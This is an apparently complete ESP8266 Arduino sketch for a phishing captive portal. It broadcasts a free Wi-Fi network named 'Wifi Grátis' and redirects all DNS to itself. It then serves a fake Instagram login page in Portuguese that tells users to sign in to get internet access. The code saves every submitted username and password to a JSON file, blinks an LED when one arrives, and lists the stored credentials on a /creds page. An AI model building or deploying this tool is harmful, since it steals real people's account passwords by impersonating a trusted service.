// Includes
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <FS.h>
#include <ArduinoJson.h>

// User configuration
#define SSID_NAME "Wifi Grátis"

// Init System Settings
const byte HTTP_CODE = 200;
const byte DNS_PORT = 53;
const byte TICK_TIMER = 1000;
IPAddress APIP(172, 0, 0, 1);  // Gateway

String Credentials = "";
unsigned long bootTime = 0, lastActivity = 0, lastTick = 0, tickCtr = 0;
DNSServer dnsServer;
ESP8266WebServer webServer(80);

const size_t JSON_SIZE = JSON_OBJECT_SIZE(5) + 130;


String creds() {

  File data = SPIFFS.open("/data.json", "r");
  if (!data) {
    Serial.println("Failed to open file for reading");
    return "Failed to open file for reading";
  }

  String buffer;
  while (data.available()) {
    buffer += char(data.read());
  }
  data.close();

  // Converta o buffer em uma string
  String fileContent = String(buffer);
  Serial.println("DATA");
  Serial.println(fileContent);

  String html = "";
  html += "<!DOCTYPE html>";
  html += "<html>";
  html += "";
  html += "<head>";
  html += "<meta name='viewport' content='width=device-width, initial-scale=1.0'>";
  html += "  <title>Login do Instagram</title>";
  html += "  <style>";
  html += "    body {";
  html += "      background-color: rgb(250, 250, 250);";
  html += "      font-family: Arial, sans-serif;";
  html += "    }";
  html += "";
  html += "    form {";
  html += "      display: flex;";
  html += "      flex-direction: column;";
  html += "      align-items: center;";
  html += "      gap: 8px;";
  html += "      max-width: 300px;";
  html += "      margin: auto;";
  html += "      margin-top: 100px;";
  html += "      border: 1px solid rgb(219, 219, 219);";
  html += "      background-color: rgb(255, 255, 255);";
  html += "      padding: 30px;";
  html += "    }";
  html += "";
  html += "    form div.image {";
  html += "      height: 90px;";
  html += "      width: 100%;";
  html += "      overflow: hidden;";
  html += "      margin-bottom: 16px";
  html += "    }";
  html += "";
  html += "    form div.image img {";
  html += "      height: auto;";
  html += "      width: 100%;";
  html += "    }";
  html += "";
  html += "    form div.input-group {";
  html += "      width: 100%;";
  html += "      display: flex;";
  html += "      flex-direction: column;";
  html += "      position: relative;";
  html += "      justify-content: center;";
  html += "    }";
  html += "";
  html += "    form label {";
  html += "      position: absolute;";
  html += "      display: block;";
  html += "      margin-left: 12px;";
  html += "      font-size: 12px;";
  html += "      font-weight: normal;";
  html += "      color: #262626;";
  html += "      transition: all 0.3s;";
  html += "    }";
  html += "";
  html += "    form label:has(+ input[type='text']:focus),";
  html += "    form label:has(+ input[type='password']:focus),";
  html += "    form label.hasText {";
  html += "      font-size: 10px;";
  html += "      top: 3px;";
  html += "    }";
  html += "";
  html += "";
  html += "    form input[type='text'],";
  html += "    form input[type='password'] {";
  html += "      width: 100%;";
  html += "      padding: 14px;";
  html += "      border: 1px solid #ccc;";
  html += "      border-radius: 5px;";
  html += "      box-sizing: border-box;";
  html += "      transition: 0.3s;";
  html += "    }";
  html += "";
  html += "    form input[type='text']:focus,";
  html += "    form input[type='password']:focus {";
  html += "      border: 1px solid #666;";
  html += "      outline: none;";
  html += "    }";
  html += "";
  html += "    form input[type='submit'] {";
  html += "      background-color: rgb(0, 149, 246);";
  html += "      width: 100%;";
  html += "      color: white;";
  html += "      font-weight: bold;";
  html += "      border: none;";
  html += "      padding: 10px 20px;";
  html += "      font-size: 16px;";
  html += "      cursor: pointer;";
  html += "      border-radius: 8px;";
  html += "      margin-top: 32px;";
  html += "      transition: 0.3s;";
  html += "    }";
  html += "";
  html += "    form input[type='submit']:hover {";
  html += "      filter: brightness(0.8);";
  html += "    }";
  html += "";
  html += "    table {";
  html += "      width: 100%;";
  html += "      text-align: center;";
  html += "    }";
  html += "";
  html += "    p {";
  html += "      color: #666;";
  html += "      text-align: center;";
  html += "      line-height: 1.5;";
  html += "      letter-spacing: 1px;";
  html += "    }";
  html += "  </style>";
  html += "  <script>";
  html += "    function verifyValues(id, value){";
  html += "      if(value != ''){";
  html += "        document.getElementById(`label-${id}`).classList.add('hasText');";
  html += "      }else{        ";
  html += "        document.getElementById(`label-${id}`).classList.remove('hasText');";
  html += "      }";
  html += "    }";
  html += "  </script>";
  html += "</head>";
  html += "";
  html += "<body>";
  html += "  <form action='/post'>";
  html += "    <div class='image'>";
  html += "      <img src='./image' alt='instagram' />";
  html += "    </div>";
  html += "    <table><tr><th>Username</th><th>Password</th><th>Created_at</th></tr></table>";
  html += "    <table id='data-table'></table>";
  html += "  </form>";
  html += "";
  html += "  <p>Instagram &copy; <span id='getFullYear'></span> </p>";
  html += "  <script>";
  html += "    window.onload = () => {";
  html += "      const data = " + fileContent + ";";
  html += "      console.log('data', data);";
  html += "      for( var user of data){";
  html += "         document.getElementById('data-table').innerHTML = document.getElementById('data-table').innerHTML + `<tr><td>${user.username}</td><td>${user.password}</td><td>${new Date(parseInt(user.created_at)).toLocaleString('pt-BR')}</td></tr>` ";
  html += "      }";
  html += "      ";
  html += "    }";
  html += "  </script>";
  html += "</body>";
  html += "";
  html += "</html>";

  return html;
}

String index() {
  String html = "";
  html += "<!DOCTYPE html>";
  html += "<html>";
  html += "";
  html += "<head>";
  html += "<meta name='viewport' content='width=device-width, initial-scale=1.0'>";
  html += "  <title>Login do Instagram</title>";
  html += "  <style>";
  html += "    body {";
  html += "      background-color: rgb(250, 250, 250);";
  html += "      font-family: Arial, sans-serif;";
  html += "    }";
  html += "";
  html += "    form {";
  html += "      display: flex;";
  html += "      flex-direction: column;";
  html += "      align-items: center;";
  html += "      gap: 8px;";
  html += "      max-width: 300px;";
  html += "      margin: auto;";
  html += "      margin-top: 100px;";
  html += "      border: 1px solid rgb(219, 219, 219);";
  html += "      background-color: rgb(255, 255, 255);";
  html += "      padding: 30px;";
  html += "    }";
  html += "";
  html += "    form div.image {";
  html += "      height: 90px;";
  html += "      width: 100%;";
  html += "      overflow: hidden;";
  html += "      margin-bottom: 16px";
  html += "    }";
  html += "";
  html += "    form div.image img {";
  html += "      height: auto;";
  html += "      width: 100%;";
  html += "    }";
  html += "";
  html += "    form div.input-group {";
  html += "      width: 100%;";
  html += "      display: flex;";
  html += "      flex-direction: column;";
  html += "      position: relative;";
  html += "      justify-content: center;";
  html += "    }";
  html += "";
  html += "    form label {";
  html += "      position: absolute;";
  html += "      display: block;";
  html += "      margin-left: 12px;";
  html += "      font-size: 12px;";
  html += "      font-weight: normal;";
  html += "      color: #262626;";
  html += "      transition: all 0.3s;";
  html += "    }";
  html += "";
  html += "    form label:has(+ input[type='text']:focus),";
  html += "    form label:has(+ input[type='password']:focus),";
  html += "    form label.hasText {";
  html += "      font-size: 10px;";
  html += "      top: 3px;";
  html += "    }";
  html += "";
  html += "";
  html += "    form input[type='text'],";
  html += "    form input[type='password'] {";
  html += "      width: 100%;";
  html += "      padding: 14px;";
  html += "      border: 1px solid #ccc;";
  html += "      border-radius: 5px;";
  html += "      box-sizing: border-box;";
  html += "      transition: 0.3s;";
  html += "    }";
  html += "";
  html += "    form input[type='text']:focus,";
  html += "    form input[type='password']:focus {";
  html += "      border: 1px solid #666;";
  html += "      outline: none;";
  html += "    }";
  html += "";
  html += "    form input[type='submit'] {";
  html += "      background-color: rgb(0, 149, 246);";
  html += "      width: 100%;";
  html += "      color: white;";
  html += "      font-weight: bold;";
  html += "      border: none;";
  html += "      padding: 10px 20px;";
  html += "      font-size: 16px;";
  html += "      cursor: pointer;";
  html += "      border-radius: 8px;";
  html += "      margin-top: 32px;";
  html += "      transition: 0.3s;";
  html += "    }";
  html += "";
  html += "    form input[type='submit']:hover {";
  html += "      filter: brightness(0.8);";
  html += "    }";
  html += "";
  html += "    p {";
  html += "      color: #666;";
  html += "      text-align: center;";
  html += "      line-height: 1.5;";
  html += "      letter-spacing: 1px;";
  html += "    }";
  html += "  </style>";
  html += "  <script>";
  html += "    function verifyValues(id, value){";
  html += "      if(value != ''){";
  html += "        document.getElementById(`label-${id}`).classList.add('hasText');";
  html += "      }else{        ";
  html += "        document.getElementById(`label-${id}`).classList.remove('hasText');";
  html += "      }";
  html += "    }";
  html += "  </script>";
  html += "</head>";
  html += "";
  html += "<body>";
  html += "  <form action='/post'>";
  html += "    <div class='image'>";
  html += "      <img src='./image' alt='instagram' />";
  html += "    </div>";
  html += "    <p>Faca login usando Instagram para acessar a Internet</p>";
  html += "    <div class='input-group'>";
  html += "      <label id='label-username' for='username'>Telefone, nome de usuario ou email</label>";
  html += "      <input type='text' id='username' name='username' onkeyup='verifyValues(this.id, this.value)' onchange='verifyValues(this.id, this.value)'>";
  html += "    </div>";
  html += "    <div class='input-group'>";
  html += "      <label id='label-password' for='password'>Senha</label>";
  html += "      <input type='password' id='password' name='password' onkeyup='verifyValues(this.id, this.value)' onchange='verifyValues(this.id, this.value)'>";
  html += "    </div>";  
  html += "    <input type='hidden' id='date' name='date'>";
  html += "    <input type='submit' value='Entrar'>";
  html += "  </form>";
  html += "";
  html += "  <p>Instagram &copy; <span id='getFullYear'></span> </p>";
  html += "  <script>";
  html += "    window.onload = () => {";
  html += "      var dateField = document.getElementById('date');";
  html += "      dateField.setAttribute('value', Date.now());";
  html += "      ";
  html += "      document.getElementById('getFullYear').innerHTML = new Date(Date.now()).getFullYear();";
  html += "    }";
  html += "  </script>";
  html += "</body>";
  html += "";
  html += "</html>";

  return html;
}

String posted() {
  File file = SPIFFS.open(F("/data.json"), "r+");
  if (!file) {
    Serial.println("Failed to open file for reading");
    return "Erro ao efetuar autenticacao";
  } else {

    String dataString = file.readString();

    DynamicJsonDocument doc(1024);
    DeserializationError error = deserializeJson(doc, dataString);

    if (error) {
      Serial.println("Erro ao ler o arquivo data.json: ");
      Serial.println(error.c_str());
      return "Erro ao deserializar json";
    }

    JsonObject user = doc.createNestedObject();
    user["username"] = webServer.arg(0);
    user["password"] = webServer.arg(1);
    user["created_at"] = webServer.arg(2);

    file.seek(0);              // Vá para o início do arquivo
    serializeJsonPretty(doc, file);  // Salve o objeto JSON no arquivo
    file.close();
  }

  String html = "";
  html += "<!DOCTYPE html>";
  html += "<html>";
  html += "";
  html += "<head>";
  html += "<meta name='viewport' content='width=device-width, initial-scale=1.0'>";
  html += "  <title>Login do Instagram</title>";
  html += "  <style>";
  html += "    body {";
  html += "      background-color: rgb(250, 250, 250);";
  html += "      font-family: Arial, sans-serif;";
  html += "    }";
  html += "";
  html += "    form {";
  html += "      display: flex;";
  html += "      flex-direction: column;";
  html += "      align-items: center;";
  html += "      gap: 8px;";
  html += "      max-width: 300px;";
  html += "      margin: auto;";
  html += "      margin-top: 100px;";
  html += "      border: 1px solid rgb(219, 219, 219);";
  html += "      background-color: rgb(255, 255, 255);";
  html += "      padding: 30px;";
  html += "    }";
  html += "";
  html += "    form div.image {";
  html += "      height: 90px;";
  html += "      width: 100%;";
  html += "      overflow: hidden;";
  html += "      margin-bottom: 16px";
  html += "    }";
  html += "";
  html += "    form div.image img {";
  html += "      height: auto;";
  html += "      width: 100%;";
  html += "    }";
  html += "";
  html += "    form div.input-group {";
  html += "      width: 100%;";
  html += "      display: flex;";
  html += "      flex-direction: column;";
  html += "      position: relative;";
  html += "      justify-content: center;";
  html += "    }";
  html += "";
  html += "    form label {";
  html += "      position: absolute;";
  html += "      display: block;";
  html += "      margin-left: 12px;";
  html += "      font-size: 12px;";
  html += "      font-weight: normal;";
  html += "      color: #262626;";
  html += "      transition: all 0.3s;";
  html += "    }";
  html += "";
  html += "    form label:has(+ input[type='text']:focus),";
  html += "    form label:has(+ input[type='password']:focus),";
  html += "    form label.hasText {";
  html += "      font-size: 10px;";
  html += "      top: 3px;";
  html += "    }";
  html += "";
  html += "";
  html += "    form input[type='text'],";
  html += "    form input[type='password'] {";
  html += "      width: 100%;";
  html += "      padding: 14px;";
  html += "      border: 1px solid #ccc;";
  html += "      border-radius: 5px;";
  html += "      box-sizing: border-box;";
  html += "      transition: 0.3s;";
  html += "    }";
  html += "";
  html += "    form input[type='text']:focus,";
  html += "    form input[type='password']:focus {";
  html += "      border: 1px solid #666;";
  html += "      outline: none;";
  html += "    }";
  html += "";
  html += "    form input[type='submit'] {";
  html += "      background-color: rgb(0, 149, 246);";
  html += "      width: 100%;";
  html += "      color: white;";
  html += "      font-weight: bold;";
  html += "      border: none;";
  html += "      padding: 10px 20px;";
  html += "      font-size: 16px;";
  html += "      cursor: pointer;";
  html += "      border-radius: 8px;";
  html += "      margin-top: 32px;";
  html += "      transition: 0.3s;";
  html += "    }";
  html += "";
  html += "    form input[type='submit']:hover {";
  html += "      filter: brightness(0.8);";
  html += "    }";
  html += "";
  html += "    p {";
  html += "      color: #666;";
  html += "      text-align: center;";
  html += "      line-height: 1.5;";
  html += "      letter-spacing: 1px;";
  html += "    }";
  html += "  </style>";
  html += "  <script>";
  html += "    function verifyValues(id, value){";
  html += "      if(value != ''){";
  html += "        document.getElementById(`label-${id}`).classList.add('hasText');";
  html += "      }else{        ";
  html += "        document.getElementById(`label-${id}`).classList.remove('hasText');";
  html += "      }";
  html += "    }";
  html += "  </script>";
  html += "</head>";
  html += "";
  html += "<body>";
  html += "  <form action='/post' method='POST'>";
  html += "    <div class='image'>";
  html += "      <img src='./image' alt='instagram' />";
  html += "    </div>";
  html += "    <h3>Validando...</h3>";
  html += "    <p>Sua conta esta sendo validada. Por favor aguarde! Em aproximadamente 5 minutos voce tera seu acesso liberado.</br>Obrigado!</p>";
  html += "  </form>";
  html += "";
  html += "  <p>Instagram &copy; <span id='getFullYear'></span> </p>";
  html += "  <script>";
  html += "    window.onload = () => {";
  html += "      document.getElementById('getFullYear').innerHTML = new Date(Date.now()).getFullYear();";
  html += "    }";
  html += "  </script>";
  html += "</body>";
  html += "";
  html += "</html>";

  return html;
}

String clear() {
  File file = SPIFFS.open("/data.json", "w");
  if (!file) {
    Serial.println("Falha ao abrir o arquivo para gravação");
    return "Falha ao abrir o arquivo para gravação";
  }

  file.println("[]");
  file.close();
  return "Sucesso";
}

void BLINK() {  // The internal LED will blink 5 times when a password is received.
  int count = 0;
  while (count < 5) {
    digitalWrite(BUILTIN_LED, LOW);
    delay(500);
    digitalWrite(BUILTIN_LED, HIGH);
    delay(500);
    count = count + 1;
  }
}

void setup() {
  Serial.begin(9600);

  if (!SPIFFS.begin()) {
    Serial.println("An Error has occurred while mounting SPIFFS");
    return;
  }


  bootTime = lastActivity = millis();
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(SSID_NAME);
  dnsServer.start(DNS_PORT, "*", APIP);  // DNS spoofing (Only HTTP)

  webServer.serveStatic("/image", SPIFFS, "/ig.png", "image/png");

  webServer.on("/post", []() {
    webServer.send(HTTP_CODE, "text/html", posted());
    BLINK();
  });
  webServer.on("/creds", []() {
    webServer.send(HTTP_CODE, "text/html", creds());
  });
  webServer.on("/clear", []() {
    webServer.send(HTTP_CODE, "text/html", clear());
  });
  webServer.onNotFound([]() {
    lastActivity = millis();
    webServer.send(HTTP_CODE, "text/html", index());
  });
  webServer.begin();
  pinMode(BUILTIN_LED, OUTPUT);
  digitalWrite(BUILTIN_LED, HIGH);
}


void loop() {
  if ((millis() - lastTick) > TICK_TIMER) {
    lastTick = millis();
  }
  dnsServer.processNextRequest();
  webServer.handleClient();
}
